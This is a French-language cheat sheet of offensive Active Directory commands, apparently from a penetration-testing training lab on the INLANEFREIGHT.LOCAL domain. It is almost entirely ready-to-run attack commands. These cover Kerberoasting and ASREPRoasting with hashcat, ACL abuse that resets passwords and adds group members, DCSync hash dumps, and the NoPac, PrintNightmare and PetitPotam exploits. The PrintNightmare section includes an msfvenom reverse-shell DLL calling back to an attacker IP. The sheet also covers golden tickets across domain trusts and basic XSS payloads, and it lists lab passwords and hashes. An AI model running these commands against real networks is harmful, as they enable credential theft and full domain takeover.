| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs` | Outil Impacket utilisé pour télécharger/demander un ticket TGS pour un compte utilisateur spécifique et écrire le ticket dans un fichier (`-outputfile sqldev_tgs`) depuis un hôte basé sur Linux. |
| `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force` | Tente de cracker le hash du ticket Kerberos (`-m 13100`) (`sqldev_tgs`) en utilisant `hashcat` et une liste de mots (`rockyou.txt`) depuis un hôte basé sur Linux. |
| `setspn.exe -Q */*` | Utilisé pour énumérer les `SPN` dans un domaine Windows cible depuis un hôte basé sur Windows. |
| `Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"` | Script PowerShell utilisé pour télécharger/demander le ticket TGS d'un utilisateur spécifique depuis un hôte basé sur Windows. |
| `setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \| Select-String '^CN' -Context 0,1 \| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }` | Utilisé pour télécharger/demander tous les tickets TGS depuis un hôte basé sur Windows. |
| `mimikatz # base64 /out:true` | Commande `Mimikatz` qui garantit que les tickets TGS sont extraits au format `base64` depuis un hôte basé sur Windows. |
| `kerberos::list /export` | Commande `Mimikatz` utilisée pour extraire les tickets TGS depuis un hôte basé sur Windows. |
| `echo "<base64 blob>" \| tr -d \\n` | Utilisé pour préparer le ticket TGS formaté en base64 pour le craquage depuis un hôte basé sur Linux. |
| `cat encoded_file \| base64 -d > sqldev.kirbi` | Utilisé pour sortir un fichier (`encoded_file`) dans un fichier .kirbi au format base64 (`base64 -d > sqldev.kirbi`) depuis un hôte basé sur Linux. |
| `python2.7 kirbi2john.py sqldev.kirbi` | Utilisé pour extraire le `ticket Kerberos`. Cela crée également un fichier appelé `crack_file` depuis un hôte basé sur Linux. |
| `sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat` | Utilisé pour modifier le `crack_file` pour `Hashcat` depuis un hôte basé sur Linux. |
| `cat sqldev_tgs_hashcat` | Utilisé pour visualiser le hash préparé depuis un hôte basé sur Linux. |
| `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt` | Utilisé pour cracker le hash du ticket Kerberos préparé (`sqldev_tgs_hashcat`) en utilisant une liste de mots (`rockyou.txt`) depuis un hôte basé sur Linux. |
| `Import-Module .\PowerView.ps1 Get-DomainUser * -spn \| select samaccountname` | Utilise l'outil PowerView pour extraire les `Tickets TGS`. Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainUser -Identity sqldev \| Get-DomainSPNTicket -Format Hashcat` | Outil PowerView utilisé pour télécharger/demander le ticket TGS d'un ticket spécifique et le formater automatiquement pour `Hashcat` depuis un hôte basé sur Windows. |
| `Get-DomainUser * -SPN \| Get-DomainSPNTicket -Format Hashcat \| Export-Csv .\ilfreight_tgs.csv -NoTypeInformation` | Exporte tous les tickets TGS vers un fichier `.CSV` (`ilfreight_tgs.csv`) depuis un hôte basé sur Windows. |
| `cat .\ilfreight_tgs.csv` | Utilisé pour visualiser le contenu du fichier .csv depuis un hôte basé sur Windows. |
| `.\Rubeus.exe` | Utilisé pour visualiser les options et la fonctionnalité possibles avec l'outil `Rubeus`. Exécuté depuis un hôte basé sur Windows. |
| `.\Rubeus.exe kerberoast /stats` | Utilisé pour vérifier les statistiques kerberoast (`/stats`) dans le domaine Windows cible depuis un hôte basé sur Windows. |
| `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap` | Utilisé pour demander/télécharger des tickets TGS pour les comptes avec le `admin` count défini sur `1`, puis formate la sortie d'une manière facile à visualiser et à cracker (`/nowrap`). Exécuté depuis un hôte basé sur Windows. |
| `.\Rubeus.exe kerberoast /user:testspn /nowrap` | Utilisé pour demander/télécharger un ticket TGS pour un utilisateur spécifique (`/user:testspn`), puis formate la sortie d'une manière facile à visualiser et à cracker (`/nowrap`). Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes` | Outil PowerView utilisé pour vérifier l'attribut `msDS-SupportedEncryptionType` associé à un compte utilisateur spécifique (`testspn`). Exécuté depuis un hôte basé sur Windows. |
| `hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt` | Utilisé pour tenter de cracker le hash du ticket en utilisant une liste de mots (`rockyou.txt`) depuis un hôte basé sur Linux. |

## Énumération et Tactiques ACL

| Commande | Description |
|----------|-------------|
| `Find-InterestingDomainAcl` | Outil PowerView utilisé pour trouver des ACL d'objets dans le domaine Windows cible avec des droits de modification définis pour des objets non intégrés depuis un hôte basé sur Windows. |
| `Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley` | Utilisé pour importer PowerView et récupérer le `SID` d'un compte utilisateur spécifique (`wley`) depuis un hôte basé sur Windows. |
| `Get-DomainObjectACL -Identity * \| ? {$_.SecurityIdentifier -eq $sid}` | Utilisé pour trouver tous les objets du domaine Windows sur lesquels l'utilisateur a des droits en mappant le `SID` de l'utilisateur à la propriété `SecurityIdentifier` depuis un hôte basé sur Windows. |
| `$guid= "00299570-246d-11d0-a768-00aa006e0529" Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \| Select Name,DisplayName,DistinguishedName,rightsGuid \| ?{$_.rightsGuid -eq $guid} \| fl` | Utilisé pour effectuer une recherche inverse et mapper à une valeur `GUID` depuis un hôte basé sur Windows. |
| `Get-DomainObjectACL -ResolveGUIDs -Identity * \| ? {$_.SecurityIdentifier -eq $sid}` | Utilisé pour découvrir l'ACL d'un objet de domaine en effectuant une recherche basée sur les GUID (`-ResolveGUIDs`) depuis un hôte basé sur Windows. |
| `Get-ADUser -Filter * \| Select-Object -ExpandProperty SamAccountName > ad_users.txt` | Utilisé pour découvrir un groupe de comptes utilisateurs dans un domaine Windows cible et ajouter la sortie à un fichier texte (`ad_users.txt`) depuis un hôte basé sur Windows. |
| `foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" \| Select-Object Path -ExpandProperty Access \| Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}` | Une `boucle foreach` utilisée pour récupérer les informations ACL pour chaque utilisateur de domaine dans un domaine Windows cible en alimentant chaque liste d'un fichier texte (`ad_users.txt`) au cmdlet `Get-ADUser`, puis énumère les droits d'accès de ces utilisateurs. Exécuté depuis un hôte basé sur Windows. |
| `$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)` | Utilisé pour créer un `Objet PSCredential` depuis un hôte basé sur Windows. |
| `$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force` | Utilisé pour créer un `Objet SecureString` depuis un hôte basé sur Windows. |
| `Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose` | Outil PowerView utilisé pour changer le mot de passe d'un utilisateur spécifique (`damundsen`) sur un domaine Windows cible depuis un hôte basé sur Windows. |
| `Get-ADGroup -Identity "Help Desk Level 1" -Properties * \| Select -ExpandProperty Members` | Outil PowerView utilisé pour visualiser les membres d'un groupe de sécurité cible (`Help Desk Level 1`) depuis un hôte basé sur Windows. |
| `Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose` | Outil PowerView utilisé pour ajouter un utilisateur spécifique (`damundsen`) à un groupe de sécurité spécifique (`Help Desk Level 1`) dans un domaine Windows cible depuis un hôte basé sur Windows. |
| `Get-DomainGroupMember -Identity "Help Desk Level 1" \| Select MemberName` | Outil PowerView utilisé pour visualiser les membres d'un groupe de sécurité spécifique (`Help Desk Level 1`) et sortir uniquement le nom d'utilisateur de chaque membre (`Select MemberName`) du groupe depuis un hôte basé sur Windows. |
| `Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose` | Outil PowerView utilisé pour créer un faux `Service Principal Name` pour un utilisateur spécifique (`adunn`) depuis un hôte basé sur Windows. |
| `Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose` | Outil PowerView utilisé pour supprimer le faux `Service Principal Name` créé pendant l'attaque depuis un hôte basé sur Windows. |
| `Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose` | Outil PowerView utilisé pour retirer un utilisateur spécifique (`damundsent`) d'un groupe de sécurité spécifique (`Help Desk Level 1`) depuis un hôte basé sur Windows. |
| `ConvertFrom-SddlString` | Cmdlet PowerShell utilisé pour convertir une `chaîne SDDL` dans un format lisible. Exécuté depuis un hôte basé sur Windows. |



# DCSync, Accès Privilégié et Exploits Windows

## Table des matières
1. [DCSync](#dcsync)
2. [Accès Privilégié](#accès-privilégié)
3. [NoPac](#nopac)
4. [PrintNightmare](#printnightmare)
5. [PetitPotam](#petitpotam)

## DCSync

| Commande | Description |
|----------|-------------|
| `Get-DomainUser -Identity adunn \| select samaccountname,objectsid,memberof,useraccountcontrol \|fl` | Outil PowerView utilisé pour visualiser l'appartenance aux groupes d'un utilisateur spécifique (`adunn`) dans un domaine Windows cible. Exécuté depuis un hôte basé sur Windows. |
| `$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs \| ? { ($_.ObjectAceType -match 'Replication-Get')} \| ?{$_.SecurityIdentifier -match $sid} \| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \| fl` | Utilisé pour créer une variable appelée SID qui est définie comme égale au SID d'un compte utilisateur. Utilise ensuite l'outil PowerView `Get-ObjectAcl` pour vérifier les droits de réplication d'un utilisateur spécifique. Exécuté depuis un hôte basé sur Windows. |
| `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss` | Outil Impacket utilisé pour extraire les hachages NTLM du fichier NTDS.dit hébergé sur un contrôleur de domaine cible (`172.16.5.5`) et enregistrer les hachages extraits dans un fichier (`inlanefreight_hashes`). Exécuté depuis un hôte basé sur Linux. |
| `mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator` | Utilise `Mimikatz` pour effectuer une attaque `dcsync` depuis un hôte basé sur Windows. |

## Accès Privilégié

| Commande | Description |
|----------|-------------|
| `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"` | Outil basé sur PowerView utilisé pour énumérer le groupe `Utilisateurs Bureau à distance` sur une cible Windows (`-ComputerName ACADEMY-EA-MS01`) depuis un hôte basé sur Windows. |
| `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"` | Outil basé sur PowerView utilisé pour énumérer le groupe `Utilisateurs de gestion à distance` sur une cible Windows (`-ComputerName ACADEMY-EA-MS01`) depuis un hôte basé sur Windows. |
| `$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force` | Crée une variable (`$password`) définie comme égale au mot de passe (`Klmcargo2`) d'un utilisateur depuis un hôte basé sur Windows. |
| `$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)` | Crée une variable (`$cred`) définie comme égale au nom d'utilisateur (`forend`) et au mot de passe (`$password`) d'un compte de domaine cible depuis un hôte basé sur Windows. |
| `Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred` | Utilise le cmdlet PowerShell `Enter-PSSession` pour établir une session PowerShell avec une cible sur le réseau (`-ComputerName ACADEMY-EA-DB01`) depuis un hôte basé sur Windows. S'authentifie à l'aide des informations d'identification créées dans les 2 commandes présentées précédemment (`$cred` & `$password`). |
| `evil-winrm -i 10.129.201.234 -u forend` | Utilisé pour établir une session PowerShell avec une cible Windows depuis un hôte basé sur Linux en utilisant `WinRM`. |
| `Import-Module .\PowerUpSQL.ps1` | Utilisé pour importer l'outil `PowerUpSQL`. |
| `Get-SQLInstanceDomain` | Outil PowerUpSQL utilisé pour énumérer les instances de serveur SQL depuis un hôte basé sur Windows. |
| `Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'` | Outil PowerUpSQL utilisé pour se connecter à un serveur SQL et interroger la version (`-query 'Select @@version'`) depuis un hôte basé sur Windows. |
| `mssqlclient.py` | Outil Impacket utilisé pour afficher les fonctionnalités et les options fournies avec `mssqlclient.py` depuis un hôte basé sur Linux. |
| `mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth` | Outil Impacket utilisé pour se connecter à un serveur MSSQL depuis un hôte basé sur Linux. |
| `SQL> help` | Utilisé pour afficher les options de mssqlclient.py une fois connecté à un serveur MSSQL. |
| `SQL> enable_xp_cmdshell` | Utilisé pour activer la `procédure stockée xp_cmdshell` qui permet d'exécuter des commandes OS via la base de données depuis un hôte basé sur Linux. |
| `xp_cmdshell whoami /priv` | Utilisé pour énumérer les droits sur un système en utilisant `xp_cmdshell`. |

## NoPac

| Commande | Description |
|----------|-------------|
| `sudo git clone https://github.com/Ridter/noPac.git` | Utilisé pour cloner un exploit `noPac` à l'aide de git. Exécuté depuis un hôte basé sur Linux. |
| `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap` | Exécute `scanner.py` pour vérifier si un système cible est vulnérable à `noPac`/`Sam_The_Admin` depuis un hôte basé sur Linux. |
| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap` | Utilisé pour exploiter la vulnérabilité `noPac`/`Sam_The_Admin` et obtenir un shell SYSTEM (`-shell`). Exécuté depuis un hôte basé sur Linux. |
| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator` | Utilisé pour exploiter la vulnérabilité `noPac`/`Sam_The_Admin` et effectuer une attaque `DCSync` contre le compte Administrateur intégré sur un contrôleur de domaine depuis un hôte basé sur Linux. |

## PrintNightmare

| Commande | Description |
|----------|-------------|
| `git clone https://github.com/cube0x0/CVE-2021-1675.git` | Utilisé pour cloner un exploit PrintNightmare à l'aide de git depuis un hôte basé sur Linux. |
| `pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install` | Utilisé pour s'assurer que la version Impacket de l'auteur de l'exploit (`cube0x0`) est installée. Cela désinstalle également toute version précédente d'Impacket sur un hôte basé sur Linux. |
| `rpcdump.py @172.16.5.5 \| egrep 'MS-RPRN\|MS-PAR'` | Utilisé pour vérifier si une cible Windows a `MS-PAR` & `MSRPRN` exposés depuis un hôte basé sur Linux. |
| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll` | Utilisé pour générer une charge utile DLL à utiliser par l'exploit pour obtenir une session shell. Exécuté depuis un hôte basé sur Windows. |
| `sudo smbserver.py -smb2support CompData /path/to/backupscript.dll` | Utilisé pour créer un serveur SMB et héberger un dossier partagé (`CompData`) à l'emplacement spécifié sur l'hôte linux local. Cela peut être utilisé pour héberger la charge utile DLL que l'exploit tentera de télécharger sur l'hôte. Exécuté depuis un hôte basé sur Linux. |
| `sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'` | Exécute l'exploit et spécifie l'emplacement de la charge utile DLL. Exécuté depuis un hôte basé sur Linux. |

## PetitPotam

| Commande | Description |
|----------|-------------|
| `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController` | Outil Impacket utilisé pour créer un `relais NTLM` en spécifiant l'URL d'inscription web pour l'hôte de l'`autorité de certification`. Exécuté depuis un hôte basé sur Linux. |
| `git clone https://github.com/topotam/PetitPotam.git` | Utilisé pour cloner l'exploit `PetitPotam` à l'aide de git. Exécuté depuis un hôte basé sur Linux. |
| `python3 PetitPotam.py 172.16.5.225 172.16.5.5` | Utilisé pour exécuter l'exploit PetitPotam en spécifiant l'adresse IP de l'hôte d'attaque (`172.16.5.255`) et le contrôleur de domaine cible (`172.16.5.5`). Exécuté depuis un hôte basé sur Linux. |
| `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 certificate> = dc01.ccache` | Utilise `gettgtpkinit.py` pour demander un ticket TGT pour le contrôleur de domaine (`dc01.ccache`) depuis un hôte basé sur Linux. |
| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` | Outil Impacket utilisé pour effectuer une attaque DCSync et récupérer un ou tous les `hachages de mot de passe NTLM` du domaine Windows cible. Exécuté depuis un hôte basé sur Linux. |
| `klist` | Commande `krb5-user` utilisée pour afficher le contenu du fichier `ccache`. Exécutée depuis un hôte basé sur Linux. |
| `python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$` | Utilisé pour soumettre des demandes TGS à l'aide de `getnthash.py` depuis un hôte basé sur Linux. |
| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba` | Outil Impacket utilisé pour extraire des hachages de `NTDS.dit` à l'aide d'une `attaque DCSync` et d'un hachage capturé (`-hashes`). Exécuté depuis un hôte basé sur Linux. |
| `.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt` | Utilise Rubeus pour demander un TGT et effectuer une `attaque pass-the-ticket` en utilisant le compte machine (`/user:ACADEMY-EA-DC01$`) d'une cible Windows. Exécuté depuis un hôte basé sur Windows. |
| `mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt` | Effectue une attaque DCSync à l'aide de `Mimikatz`. Exécuté depuis un hôte basé sur Windows. |



# Mauvaises Configurations, Relations de Confiance et XSS

## Table des matières
1. [Mauvaises Configurations Diverses](#mauvaises-configurations-diverses)
2. [Énumération et Attaques de Stratégie de Groupe](#énumération-et-attaques-de-stratégie-de-groupe)
3. [ASREPRoasting](#asreproasting)
4. [Relations de Confiance - Enfant > Parent](#relations-de-confiance---enfant--parent)
5. [Relations de Confiance - Inter-Forêts](#relations-de-confiance---inter-forêts)
6. [XSS](#xss)

## Mauvaises Configurations Diverses

| Commande | Description |
|----------|-------------|
| `Import-Module .\SecurityAssessment.ps1` | Utilisé pour importer le module `Security Assessment.ps1`. Exécuté depuis un hôte basé sur Windows. |
| `Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` | Outil basé sur SecurityAssessment.ps1 utilisé pour énumérer une cible Windows pour le `bug d'imprimante MS-PRN`. Exécuté depuis un hôte basé sur Windows. |
| `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5` | Utilisé pour résoudre tous les enregistrements dans une zone DNS via `LDAP` depuis un hôte basé sur Linux. |
| `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r` | Utilisé pour résoudre les enregistrements inconnus dans une zone DNS en effectuant une `requête A` (`-r`) depuis un hôte basé sur Linux. |
| `Get-DomainUser * \| Select-Object samaccountname,description` | Outil PowerView utilisé pour afficher le champ description des objets sélectionnés (`Select-Object`) sur un domaine Windows cible depuis un hôte basé sur Windows. |
| `Get-DomainUser -UACFilter PASSWD_NOTREQD \| Select-Object samaccountname,useraccountcontrol` | Outil PowerView utilisé pour vérifier le paramètre `PASSWD_NOTREQD` des objets sélectionnés (`Select-Object`) sur un domaine Windows cible depuis un hôte basé sur Windows. |
| `ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts` | Utilisé pour lister le contenu d'un partage hébergé sur une cible Windows depuis le contexte d'un utilisateur actuellement connecté. Exécuté depuis un hôte basé sur Windows. |

## Énumération et Attaques de Stratégie de Groupe

| Commande | Description |
|----------|-------------|
| `gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE` | Outil utilisé pour déchiffrer un `mot de passe de préférence de stratégie de groupe` capturé depuis un hôte basé sur Linux. |
| `crackmapexec smb -L \| grep gpp` | Localise et récupère un `mot de passe de préférence de stratégie de groupe` en utilisant `CrackMapExec`, puis filtre la sortie en utilisant `grep`. Exécuté depuis un hôte basé sur Linux. |
| `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin` | Localise et récupère toutes les informations d'identification stockées dans le partage `SYSVOL` d'une cible Windows en utilisant `CrackMapExec` depuis un hôte basé sur Linux. |
| `Get-DomainGPO \| select displayname` | Outil PowerView utilisé pour énumérer les noms de GPO dans un domaine Windows cible depuis un hôte basé sur Windows. |
| `Get-GPO -All \| Select DisplayName` | Cmdlet PowerShell utilisé pour énumérer les noms de GPO. Exécuté depuis un hôte basé sur Windows. |
| `$sid=Convert-NameToSid "Domain Users"` | Crée une variable appelée `$sid` qui est définie comme égale à l'outil `Convert-NameToSid` et spécifie le compte de groupe `Domain Users`. Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainGPO \| Get-ObjectAcl \| ?{$_.SecurityIdentifier -eq $sid` | Outil PowerView qui est utilisé pour vérifier si le groupe `Domain Users` (`eq $sid`) a des droits sur une ou plusieurs GPO. Exécuté depuis un hôte basé sur Windows. |
| `Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532` | Cmdlet PowerShell utilisé pour afficher le nom d'une GPO étant donné un `GUID`. Exécuté depuis un hôte basé sur Windows. |

## ASREPRoasting

| Commande | Description |
|----------|-------------|
| `Get-DomainUser -PreauthNotRequired \| select samaccountname,userprincipalname,useraccountcontrol \| fl` | Outil basé sur PowerView utilisé pour rechercher la valeur `DONT_REQ_PREAUTH` dans les comptes utilisateurs d'un domaine Windows cible. Exécuté depuis un hôte basé sur Windows. |
| `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat` | Utilise `Rubeus` pour effectuer une `attaque ASREP Roasting` et formate la sortie pour `Hashcat`. Exécuté depuis un hôte basé sur Windows. |
| `hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt` | Utilise `Hashcat` pour tenter de cracker le hash capturé en utilisant une liste de mots (`rockyou.txt`). Exécuté depuis un hôte basé sur Linux. |
| `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt` | Énumère les utilisateurs dans un domaine Windows cible et récupère automatiquement l'`AS` pour tous les utilisateurs trouvés qui ne nécessitent pas de pré-authentification Kerberos. Exécuté depuis un hôte basé sur Linux. |

## Relations de Confiance - Enfant > Parent

| Commande | Description |
|----------|-------------|
| `Import-Module activedirectory` | Utilisé pour importer le module `Active Directory`. Exécuté depuis un hôte basé sur Windows. |
| `Get-ADTrust -Filter *` | Cmdlet PowerShell utilisé pour énumérer les relations de confiance d'un domaine Windows cible. Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainTrust` | Outil PowerView utilisé pour énumérer les relations de confiance d'un domaine Windows cible. Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainTrustMapping` | Outil PowerView utilisé pour effectuer une cartographie des relations de confiance de domaine depuis un hôte basé sur Windows. |
| `Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL \| select SamAccountName` | Outils PowerView utilisés pour énumérer les utilisateurs dans un domaine enfant cible depuis un hôte basé sur Windows. |
| `mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt` | Utilise Mimikatz pour obtenir le `NT Hash` du compte `KRBTGT` depuis un hôte basé sur Windows. |
| `Get-DomainSID` | Outil PowerView utilisé pour obtenir le SID d'un domaine enfant cible depuis un hôte basé sur Windows. |
| `Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" \| select distinguishedname,objectsid` | Outil PowerView utilisé pour obtenir le SID du groupe `Enterprise Admins` depuis un hôte basé sur Windows. |
| `ls \\academy-ea-dc01.inlanefreight.local\c$` | Utilisé pour tenter de lister le contenu du lecteur C sur un contrôleur de domaine cible. Exécuté depuis un hôte basé sur Windows. |
| `mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt` | Utilise `Mimikatz` pour créer un `Golden Ticket` depuis un hôte basé sur Windows. |
| `.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt` | Utilise `Rubeus` pour créer un `Golden Ticket` depuis un hôte basé sur Windows. |
| `mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm` | Utilise `Mimikatz` pour effectuer une attaque DCSync depuis un hôte basé sur Windows. |
| `secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt` | Outil Impacket utilisé pour effectuer une attaque DCSync depuis un hôte basé sur Linux. |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240` | Outil Impacket utilisé pour effectuer une attaque de `force brute SID` depuis un hôte basé sur Linux. |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \| grep "Domain SID"` | Outil Impacket utilisé pour récupérer le SID d'un domaine Windows cible depuis un hôte basé sur Linux. |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 \| grep -B12 "Enterprise Admins"` | Outil Impacket utilisé pour récupérer le `SID` d'un domaine Windows cible et l'attacher au `RID` du groupe Enterprise Admin depuis un hôte basé sur Linux. |
| `ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker` | Outil Impacket utilisé pour créer un `Golden Ticket` depuis un hôte basé sur Linux. |
| `export KRB5CCNAME=hacker.ccache` | Utilisé pour définir la `variable d'environnement KRB5CCNAME` depuis un hôte basé sur Linux. |
| `psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5` | Outil Impacket utilisé pour établir une session shell avec un contrôleur de domaine cible depuis un hôte basé sur Linux. |
| `raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm` | Outil Impacket qui effectue automatiquement une attaque qui permet l'escalade de privilèges du domaine enfant vers le domaine parent. |

## Relations de Confiance - Inter-Forêts

| Commande | Description |
|----------|-------------|
| `Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \| select SamAccountName` | Outil PowerView utilisé pour énumérer les comptes pour les `SPN` associés depuis un hôte basé sur Windows. |
| `Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc \| select samaccountname,memberof` | Outil PowerView utilisé pour énumérer le compte `mssqlsvc` depuis un hôte basé sur Windows. |
| `.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap` | Utilise `Rubeus` pour effectuer une attaque Kerberoasting contre un domaine Windows cible (`/domain:FREIGHTLOGISTICS.local`) depuis un hôte basé sur Windows. |
| `Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL` | Outil PowerView utilisé pour énumérer les groupes avec des utilisateurs qui n'appartiennent pas au domaine depuis un hôte basé sur Windows. |
| `Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator` | Cmdlet PowerShell utilisé pour se connecter à distance à un système Windows cible depuis un hôte basé sur Windows. |
| `GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley` | Outil Impacket utilisé pour demander (`-request`) le ticket TGS d'un compte dans un domaine Windows cible (`-target-domain`) depuis un hôte basé sur Linux. |
| `bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2` | Exécute l'implémentation Python de `BloodHound` contre un domaine Windows cible depuis un hôte basé sur Linux. |
| `zip -r ilfreight_bh.zip *.json` | Utilisé pour compresser plusieurs fichiers en un seul fichier `.zip` à télécharger dans l'interface BloodHound. |

## XSS

| Code | Description |
|------|-------------|
| **Payloads XSS** | |
| `<script>alert(window.origin)</script>` | Payload XSS de base |
| `<plaintext>` | Payload XSS de base |
| `<script>print()</script>` | Payload XSS de base |
| `<img src="" onerror=alert(window.origin)>` | Payload XSS basé sur HTML |
